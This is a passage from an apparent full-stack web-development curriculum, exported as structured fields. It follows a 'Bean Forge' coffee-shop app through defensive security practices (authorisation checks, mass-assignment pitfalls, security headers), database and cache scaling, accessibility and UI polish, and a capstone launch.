Explain the difference between authentication and authorisation with a concrete Bean Forge example. Authentication: "who are you?" — the login flow where you verify the email and password, create a session, and establish that this is user ID 123. Authorisation: "what are you allowed to do?" — checking that user 123 has permission to access the admin panel or delete an order. A bug in authentication means someone else can log in as user 123. A bug in authorisation means user 123 can do things they should not be allowed to do (access another user's orders, reach admin-only endpoints). Both must be implemented correctly.

Your Bean Forge API receives a request: PATCH /orders/456 with body { status: "completed" }. What authorisation checks must happen before you process this? First, is the user authenticated (is there a valid session)? If not, return 401. Second, does order 456 exist? If not, return 404. Third, does the authenticated user have permission to update this order? If the user is a customer, they should not be able to mark orders as completed — that is staff/admin only. Check the user's role. If customer, return 403. If staff or admin, proceed with the update. Also: does order 456 belong to this user? If customer, they should only access their own orders. Add that check too.

If there are vulnerabilities, check if a patch is available (npm audit fix). Read the OWASP Top 10 at owasp.org — just the descriptions, not the full guides. Know what each of the ten categories is.
common_mistakes: Trusting user input at any layer. Validate on the client for UX (instant feedback), validate on the server for security. Client-side validation can be bypassed by sending raw HTTP requests. Server-side validation cannot.

Using object spread to update database records with user input: await prisma.user.update({ data: req.body }). This allows mass assignment — an attacker can include { role: "admin" } in the request body and promote themselves. Always explicitly list the fields you allow: { data: { name: req.body.name } }.

Not checking authorisation at the resource level. Checking that the user is authenticated (has a valid session) is not the same as checking that they are authorised to access THIS specific resource. Always verify that the requested resource belongs to or is accessible by the authenticated user.

Logging full error stack traces to the API response. Stack traces reveal your file structure, library versions, and code logic to potential attackers. Return generic error messages to clients; log the full error server-side.

Missing security headers. A single helmet() call in Express or a security headers configuration in next.config.ts adds meaningful protection against clickjacking, XSS (via CSP), and HTTPS downgrade attacks.
weeks.debug_help: Helmet is breaking your application (CSS or images not loading): Helmet's Content-Security-Policy is blocking inline styles or scripts. Configure the CSP to allow your specific origins: helmet({ contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], styleSrc: ["'self'", "'unsafe-inline'"] } } }). Start with reportOnly: true to log violations without blocking, then tighten the policy. npm audit shows vulnerabilities but npm audit fix breaks things: some vulnerabilities are in transitive dependencies that you cannot upgrade directly. Read the advisory — is it actually exploitable in your usage? If not, add it to .nsprc or snyk ignore. If it is, find which dependency brings it in and pin to a safe version or find an alternative. Rate limiting is blocking legitimate users: lower the limit or add an allowlist for trusted IPs. Also consider using a sliding window (express-rate-limit's windowMs) so users are not blocked for a full 15 minutes after 5 attempts.
stretch: Run OWASP ZAP (a free security scanner) against your Bean Forge development instance. Fix the vulnerabilities it identifies. This is what security teams use to find issues before attackers do.

Implement Content Security Policy with nonces for your Next.js app. A nonce is a random value generated per request and added to the CSP header and to inline script tags. This allows specific inline scripts while blocking injected ones. Next.js middleware can generate nonces.

Add a security.txt file at /.well-known/security.txt. This tells security researchers how to responsibly disclose vulnerabilities they find. Include a contact email and a PGP public key for encrypted reports.

weeks.title: Scaling — When 10x More Traffic Hits
weeks.context:
Most applications never need to scale to millions of users. But understanding scaling teaches you how databases, networks, and servers actually work — knowledge that makes you a better developer even for small applications. And if your application does grow, you should know the sequence of bottlenecks you will hit and how to address each.

The first scaling bottleneck is almost always the database. Databases handle reads and writes; reads are much more common (in a typical web app, 90%+ of requests are reads). The first tool: read replicas. You keep one primary database that handles writes. You create one or more replicas (copies that stay in sync with the primary) and route read queries to them. This multiplies your read capacity. With Prisma, you configure a datasource for the read replica and use it for read-only queries.

Database indexing is the highest-ROI performance optimisation in most applications. Without an index, every query scans every row in the table. An index is a data structure (usually a B-tree) that the database maintains separately, allowing lookups in O(log n) instead of O(n). Add indexes to columns you filter or sort by frequently. Check slow queries with EXPLAIN ANALYZE in PostgreSQL — queries with "Seq Scan" on large tables usually need an index. The cost: indexes take disk space and slow down writes slightly (the index must be updated on every write). Do not add indexes speculatively — add them when you have evidence of a slow query.

Horizontal scaling: running multiple instances of your application server behind a load balancer. Stateless applications (no in-memory state, sessions stored in the database or Redis) scale horizontally without issues — any instance can handle any request. Stateful concerns (WebSocket connections, in-memory caches) do not scale horizontally without coordination (Redis adapter for Socket.IO, shared Redis cache).

Caching: serving responses from memory instead of recalculating them. Redis is the standard in-memory data store for caching. Cache database query results for data that does not change often. Cache rendered HTML for pages that are the same for all users. Cache external API responses. Always define a TTL (time to live) — stale data is usually better than slow responses, up to a point.

CDN for static assets: images, JavaScript bundles, CSS. Already covered in W18 — but at scale, this removes significant load from your servers.

items.title: Prove you understood it
items.body: You have a query that fetches all orders for a user: SELECT * FROM orders WHERE userId = $1 ORDER BY createdAt DESC. The orders table has 2 million rows. This query takes 3 seconds. What do you do? Run EXPLAIN ANALYZE — it will show a sequential scan with cost estimated at thousands. Add an index: CREATE INDEX idx_orders_userid ON orders(userId). PostgreSQL can now jump directly to the rows for that userId. For the ORDER BY, a composite index on (userId, createdAt DESC) is even better — the database gets the results in order without a sort step. After adding the index, EXPLAIN ANALYZE should show an "Index Scan" and the query should take milliseconds.

mastery_questions: You have a query that fetches all orders for a user: SELECT * FROM orders WHERE userId = $1 ORDER BY createdAt DESC. The orders table has 2 million rows. This query takes 3 seconds. What do you do? Run EXPLAIN ANALYZE — it will show a sequential scan with cost estimated at thousands. Add an index: CREATE INDEX idx_orders_userid ON orders(userId). PostgreSQL can now jump directly to the rows for that userId. For the ORDER BY, a composite index on (userId, createdAt DESC) is even better — the database gets the results in order without a sort step. After adding the index, EXPLAIN ANALYZE should show an "Index Scan" and the query should take milliseconds.

Your application server has 2GB of RAM and is using 1.8GB under peak load. You want to scale horizontally — run 3 instances behind a load balancer. What must be true about your application for this to work? The application must be stateless: no data that must be shared between instances stored in process memory. Sessions must be stored in the database or Redis (not in-process memory). Any caches must be in Redis (not in-process LRU caches — each instance would have its own). File uploads must go directly to S3, not to the server's local filesystem. WebSocket connections need the Redis adapter. If all of these are met, instances are interchangeable and the load balancer can route any request to any instance.

You cache the menu for Bean Forge in Redis with a 1-hour TTL. An admin updates a menu item. How do users see the change before the hour expires? Cache invalidation on update. When the admin saves the menu item change, your server calls redis.del('menu:all') to delete the cached value. The next request finds no cache entry and fetches from the database, warming the cache again. This is the "invalidate on write" pattern. The alternative is "write-through caching": update the cache at the same time you update the database. Both work; invalidate-on-write is simpler.

Your load balancer health check hits /api/health every 10 seconds. If health check fails 3 times in a row, the instance is removed from the rotation. What should your health check endpoint return and how should the load balancer behave? The endpoint returns 200 if the instance is healthy (database reachable, Redis reachable), 503 if not. The load balancer removes unhealthy instances. But: if all instances become unhealthy simultaneously (shared database goes down), removing all instances causes an outage. Consider whether the health check should return 200 even when the database is down (at least the instance can serve cached responses) — this is a judgment call based on whether partial degradation is better than a 502.
ai_assist: "I have these slow PostgreSQL queries: [paste queries and EXPLAIN ANALYZE output]. Recommend which indexes to add, explain why each index helps, and show the CREATE INDEX statements."

"Write a Redis caching wrapper for a Prisma query in TypeScript. It takes a cache key, a TTL in seconds, and an async function that returns data. On the first call, it runs the function and stores the result in Redis. On subsequent calls, it returns the cached value. On cache miss or error, it falls back to the function."

"Generate a k6 load test script for my Bean Forge application that simulates: 50 virtual users browsing the menu, 20 users logging in and placing orders, and 5 users hitting the admin panel. Run for 5 minutes and measure p95 and p99 response times."
weeks.pre_flight: Install ioredis: npm i ioredis. Create a free Redis instance on Upstash (upstash.com — free tier, no credit card required, Redis-compatible REST API). Add REDIS_URL to your .env. Read the PostgreSQL EXPLAIN ANALYZE documentation. Run EXPLAIN ANALYZE on a few of your existing queries to see whether they are doing sequential scans.
common_mistakes: Adding indexes to every column "just in case." Indexes cost write performance and storage. Add them when you have a slow query, not speculatively. One correctly placed index on a frequently-queried column has more impact than ten indexes on rarely-queried ones.

Caching with no TTL or an infinite TTL. Cached data becomes stale. Always set a TTL appropriate to how often the data changes. Menu items: cache for 1 hour with invalidation on update. User profiles: cache for 5 minutes. Real-time stock levels: do not cache.

N+1 database queries at scale. Fetching a list of 100 orders and then making one query per order to get the customer name is 101 queries instead of 1. This is invisible at small scale and catastrophic at large scale. Use Prisma include to load related data in one query.

Premature optimisation. Do not add Redis, read replicas, and horizontal scaling before you have evidence that you need them. Measure first: add slow query logging to your database, track request latency in your APM, find the actual bottleneck. Premature scaling adds complexity and cost.

Not load testing before scaling decisions. Deploy a load testing tool (k6, Artillery, or Locust) against your staging environment. Simulate 100, 500, 1000 concurrent users. Find where things break before they break in production.
weeks.debug_help: Redis cache misses on every request: check that your Redis connection is actually connecting — log the result of redis.ping() on startup. Check that you are using the same cache key for writing and reading. Key typos are common. Query is still slow after adding an index: run EXPLAIN ANALYZE again. If the database is not using your index, it may be choosing a sequential scan because the table is small (the planner thinks it is faster) or because the query involves a function on the column (WHERE LOWER(email) = ... prevents index use — create a functional index instead). Load balancer is routing all traffic to one instance: check the load balancing algorithm. Round-robin distributes evenly. Least connections routes to the instance with fewest open connections, which is better for uneven request durations.
stretch: Implement connection pooling for your PostgreSQL database using PgBouncer (or Prisma Accelerate, which includes connection pooling). Serverless deployments (Vercel) open a new database connection on every function invocation — connection pooling prevents you from exhausting PostgreSQL's connection limit under load.
Set up a read replica on Neon (neon.tech) and configure Prisma to route read queries to the replica and writes to the primary. Measure the latency difference between primary and replica queries.

Write a cache-aside implementation with stale-while-revalidate behaviour. When a cached value is within 10% of its TTL, return the stale value immediately but trigger a background refresh. This eliminates cache stampedes (many requests all arriving at once when the cache expires).

weeks.title: Polish — The Last 5% That Takes 50% of the Time
weeks.context:
The last 5% of polish is what users notice most. A technically correct application that has rough edges — janky animations, confusing error states, unclear loading feedback, inconsistent spacing — feels unfinished. Users make judgments about quality from these details, not from the underlying code. This week you go through Bean Forge with a fine-tooth comb and fix everything that makes it feel like a side project instead of a product.

Accessibility: your application must work for users who navigate with a keyboard, use a screen reader, or have colour vision deficiencies. Keyboard navigation: every interactive element (buttons, links, form fields, modals) must be reachable and operable with Tab, Enter, and Escape. Focus indicators must be visible (do not remove the outline without replacing it). Modal dialogs must trap focus inside them when open. Screen readers: use semantic HTML (nav, main, section, button, not div for everything). Add ARIA labels where the visual context is not available to screen readers (icon buttons need aria-label). Colour contrast: text must have at least 4.5:1 contrast ratio against its background (WCAG AA). Test with the WebAIM Contrast Checker.

Error states: every form submission, every data fetch, every user action can fail. Design and implement the error states explicitly. An error message must tell the user what went wrong and what they can do about it. "An error occurred" is not an error message. "Your card was declined — please try a different payment method" is.

Empty states: when a list has no items, show a helpful empty state that explains why and what the user can do. The orders page for a new user with no orders should not show a blank white space — it should explain that there are no orders yet and link to the menu.

Loading states: use skeletons (placeholder shapes) instead of spinners for content that has a known layout. A skeleton shows the layout while data loads, preventing layout shift and looking more professional than a spinner in the middle of the page.

Micro-interactions: small animations that give feedback. A button that compresses slightly when pressed. A form field that shakes when validation fails. A toast that slides in from the corner. These are 1-2 hours of work that make the application feel alive. Use Framer Motion or CSS transitions.
topics: Empty states — what users see before they have data
Loading states — skeleton screens, optimistic UI, perceived performance
Error states — what to show when something fails, recovery actions
Microcopy — every button, every label, every error message
Accessibility (a11y) — semantic HTML, ARIA, keyboard, screen readers, contrast
Internationalisation — even if your product is English-only, plan for it
Mobile UX — touch targets, viewport, safe areas
Onboarding — the first 5 minutes determine retention

Test every page with keyboard only; fix focus management, focus traps in modals, escape closes

items.title: Prove you understood it
items.body: You have a button that opens a dialog modal. When the dialog opens, the user presses Tab. Where should focus go and what should Tab behaviour be inside the modal? When the modal opens, focus must move to the first focusable element inside the modal (or the modal itself if it has tabIndex={0}). While the modal is open, Tab should cycle through focusable elements inside the modal only — focus must not escape to elements behind the modal. When the modal closes (Escape key or close button), focus must return to the button that opened it. This is focus trapping. Use the focus-trap-react library or implement it manually with a ref and a keydown listener.

mastery_questions: You have a button that opens a dialog modal. When the dialog opens, the user presses Tab. Where should focus go and what should Tab behaviour be inside the modal? When the modal opens, focus must move to the first focusable element inside the modal (or the modal itself if it has tabIndex={0}). While the modal is open, Tab should cycle through focusable elements inside the modal only — focus must not escape to elements behind the modal. When the modal closes (Escape key or close button), focus must return to the button that opened it. This is focus trapping. Use the focus-trap-react library or implement it manually with a ref and a keydown listener.

You are building a search results list. The search query triggers a loading state while fetching. What should the UI show, and how do you handle the transition? Show a skeleton: a set of grey placeholder shapes that match the layout of a result item — a rectangle for the image, a wider rectangle for the title, a narrower one for the description. When results arrive, replace the skeletons with real content using a fade-in transition. If there are no results, show the empty state. If the fetch errors, show an error state with a "Try again" button. Every async operation has three states — loading, success, error — and all three must be designed and implemented.

A user fills in a 10-field form and submits it. Validation fails. Where do the error messages appear, and how do you handle focus? Error messages must appear adjacent to the field that failed, not just at the top of the form. Each error message is associated with its field via aria-describedby (the input has aria-describedby="field-name-error" and the error span has id="field-name-error"). The screen reader reads the error when the user focuses the field. On submission failure, focus should move to the first field with an error. For the error summary at the top of the form (if you have one), each item links to the field it describes.

Your site has a purple button (#6B46C1) on a white background. Is this accessible? What is the contrast ratio? #6B46C1 on white has a contrast ratio of approximately 5.9:1. WCAG AA requires 4.5:1 for normal text, 3:1 for large text (18pt+) and UI components. A button passes for normal text at this ratio. WCAG AAA requires 7:1 — this button would not pass AAA. Use the WebAIM Contrast Checker to verify before committing colour choices.
ai_assist: "Review this React component for accessibility issues: [paste component]. Identify: missing ARIA labels, incorrect semantic HTML, focus management problems, keyboard navigation issues, and colour contrast concerns. For each issue, explain the impact on users and provide the fix."

"Write a reusable Modal component in React that: traps focus inside the modal, moves focus to the modal heading when opened, returns focus to the trigger element when closed, closes on Escape key, and has the correct ARIA roles (role='dialog', aria-modal='true', aria-labelledby)."

"Write Framer Motion animations for these interactions: a list item that animates in when it appears (fade + slide from left), a button that shrinks on press, a form field that shakes horizontally when it has a validation error. Keep animations under 300ms."
weeks.pre_flight: Install the axe browser extension (axe DevTools in Chrome) for accessibility testing. Install Framer Motion for animations: npm i framer-motion. Have the WebAIM Contrast Checker bookmarked (webaim.org/resources/contrastchecker). Know how to use Chrome DevTools Accessibility panel (Elements > Accessibility tab) to inspect the accessibility tree. Run your application and go through every page manually with Tab key navigation — note every place where focus is lost or the wrong element is focused.
common_mistakes: Removing the CSS outline on focus without providing an alternative. outline: none removes the browser's built-in focus indicator. Screen keyboard users and keyboard users lose all visual feedback about which element is focused. Replace it with a custom :focus-visible style: outline: 2px solid #6B46C1; outline-offset: 2px.

Using colour alone to communicate status. A red error message with no other indicator (icon, text, label) is invisible to colour-blind users. Always pair colour with another indicator: an icon, different text, or a border.

Abrupt content transitions. When new content loads (search results arrive, a panel slides in), sudden layout changes feel janky. Use Framer Motion's AnimatePresence and layout animations to make additions and removals smooth.

Generic error messages that do not help. "Something went wrong" is not an error message. Tell the user what failed and what they can do: "Your session expired — please sign in again" with a "Sign In" link. "We could not connect to the payment system — please try again in a few minutes."

Not testing on mobile. Development happens on a laptop. Users use phones. Test on real devices (or Chrome DevTools device emulation) at every stage. Touch targets must be at least 44x44px (iOS HIG) — small icon buttons fail this. Scrollable areas that clip on mobile are invisible in desktop development.
weeks.debug_help: axe reports "Images must have alternate text": add an alt attribute to all img tags. For decorative images (icons, decorative backgrounds), use alt="" — screen readers skip elements with empty alt. For meaningful images, describe what the image conveys. Framer Motion animations cause layout shift: use layout prop on animated elements to let Framer Motion handle size changes. Use AnimatePresence to animate elements that enter and leave the DOM. Button is not reachable by keyboard: if you used a div or span instead of a button element, add tabIndex={0} and an onKeyDown handler for Enter and Space. Or better: use a real button element — it gets keyboard focus for free. Focus trap not working in modal: check that all focusable elements in the modal are within the trap boundary. Elements with display:none or visibility:hidden are not focusable and are correctly skipped.
stretch: Run your entire application through the WAVE accessibility checker (wave.webaim.org) and the axe DevTools extension. Fix every error and warning. Then test with a real screen reader: VoiceOver on macOS (Cmd+F5) or NVDA on Windows (free). Navigate through your application without looking at the screen.

Implement skeleton loading for every data-fetching page in Bean Forge. Create a Skeleton component that renders grey rectangles. Compose skeletons to match the layout of the real content. Use Framer Motion to animate them with a shimmer effect.

Conduct a 30-minute unmoderated usability test. Ask a friend or family member to use Bean Forge to complete three tasks (browse the menu, sign up, place an order) while thinking aloud. Watch where they hesitate, get confused, or make mistakes. Fix the three biggest issues.

weeks.title: Capstone — Ship a SaaS, Real Users, Real Revenue
weeks.context:
This is the week you stop building features and start shipping a product. Bean Forge has evolved from a static HTML page to a full-stack SaaS with authentication, payments, real-time updates, file uploads, and email. Week 24 is not about adding anything — it is about making everything you have built solid, documented, and ready for real users.

A real SaaS needs a public landing page, pricing page, and blog. It needs a production monitoring setup (Sentry, uptime monitoring, structured logs). It needs a runbook: a document that describes what to do when something breaks in production. It needs a privacy policy and terms of service (real legal documents — use a template generator like Termly or the EFF's model privacy policy, then have a lawyer review before you have real users). It needs an onboarding flow: what happens between a user signing up and them getting value from the product?

The capstone project: you will ship Bean Forge as a real, publicly accessible SaaS. Set a goal of 10 real users (not test accounts, not friends being polite — users who actually use the product). To get 10 users, you need to distribute it: post in relevant communities (Reddit communities for coffee shop owners, Product Hunt, Twitter/X, local business groups), reach out directly to small coffee shop owners, or write a blog post about building it. The constraint of real users forces every previous lesson into sharp focus: performance matters because users on slow connections will leave; security matters because real data is at stake; reliability matters because users expect the product to be there.

The capstone project for this track is not a toy. It is something you can put in your portfolio, link in job applications, and point to when asked to demonstrate full-stack experience. The code is on GitHub (public, with a clean README), the application is live on a real domain, and it has at least one paying subscriber (even if it is you, to prove the payment flow works end-to-end).

items.title: Prove you understood it
items.body: You have 10 users. One of them emails you at 2am saying "I can't log in." What is your process? Step 1: check your uptime monitor — is the site down? Step 2: check Sentry — is there an unhandled exception in the auth flow? Step 3: check your structured logs for login attempts from that user's email — did the attempt reach the server? What was the response? Step 4: try logging in yourself — does it work for you? Step 5: if you cannot reproduce it, ask the user for their browser, device, and any error message they saw. Step 6: if the site is down, follow your runbook for the incident type. If you can reproduce the bug, write a failing test first, then fix it.
